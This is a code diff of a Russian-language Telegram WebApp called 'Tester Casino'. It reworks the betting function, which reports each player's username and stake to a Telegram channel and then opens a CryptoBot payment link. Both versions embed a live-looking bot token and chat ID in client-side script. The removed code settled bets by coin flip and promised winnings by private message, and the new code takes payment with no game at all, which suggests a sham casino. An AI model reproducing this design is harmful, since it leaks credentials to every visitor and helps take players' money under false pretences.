@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Tester Casino - WebApp</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body, html {
             height: 100%;
@@ -17,14 +18,16 @@
             color: white;
             overflow: hidden;
         }
-        
+
         .container {
             background: rgba(0, 0, 0, 0.8);
             padding: 20px;
             border-radius: 10px;
+            display: inline-block;
             max-width: 90%;
             width: 400px;
             text-align: center;
+            position: relative;
         }
 
         h2 {
@@ -52,7 +55,6 @@
             background-color: #218838;
         }
     </style>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script> <!-- Подключение Telegram API -->
 </head>
 <body>
 
@@ -75,7 +77,7 @@
     <script>
         function placeBet() {
             if (!window.Telegram || !Telegram.WebApp) {
-                alert("❌ Открывайте WebApp через Telegram!");
+                alert("Открывайте WebApp через Telegram!");
                 return;
             }
 
@@ -87,36 +89,22 @@
                 return;
             }
 
-            let paymentUrl = `https://t.me/send?start=IVyytgNj3snE&amount=${betAmount}`;
-            let username = Telegram.WebApp.initDataUnsafe?.user?.username || 'Аноним';
-            let token = '7480442854:AAEs_EILlE85qomG5-hW6rZ9bvISLqaXm4U';
-            let chatId = '1002348053681';
+            let paymentUrl = `https://t.me/CryptoBot?start=IVyytgNj3snE&amount=${betAmount}`;
 
+            let username = Telegram.WebApp.initDataUnsafe?.user?.username || "Аноним";
             let message = `🔑 Игрок: ${username}\n🚀 Режим: ${game}\n💸 Сумма ставки: ${betAmount} USD`;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                .then(() => {
-                    Telegram.WebApp.close();
-                    setTimeout(() => {
-                        window.location.href = paymentUrl;
-                    }, 500);
-                })
-                .catch(err => console.error("Ошибка при отправке в канал:", err));
+            let token = "7480442854:AAEs_EILlE85qomG5-hW6rZ9bvISLqaXm4U";
+            let chatId = "-1002348053681"; // ID канала или группы
 
-            setTimeout(() => {
-                let win = Math.random() < 0.5;
-                let resultMessage = `🔑 Игрок: ${username}\n🚀 Режим: ${game} — ${win ? 'Выигрыш' : 'Поражение'}\n💸 Сумма ставки: ${betAmount} USD`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
 
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(resultMessage)}`);
-
-                if (win) {
-                    let prize = (betAmount * 1.5).toFixed(2);
-                    let prizeInRub = (prize * 75).toFixed(2);
-                    let winMessage = `🎉 Поздравляем, вы выиграли ${prize} USD (${prizeInRub} RUB)!\n🚀 Ваш выигрыш будет в чеке, вам его скинут в лс!🔥 Удачи в следующих ставках!`;
-
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(winMessage)}`);
-                }
-            }, 5000);
+            Telegram.WebApp.openTelegramLink(paymentUrl);
+            Telegram.WebApp.close();
         }
     </script>
 
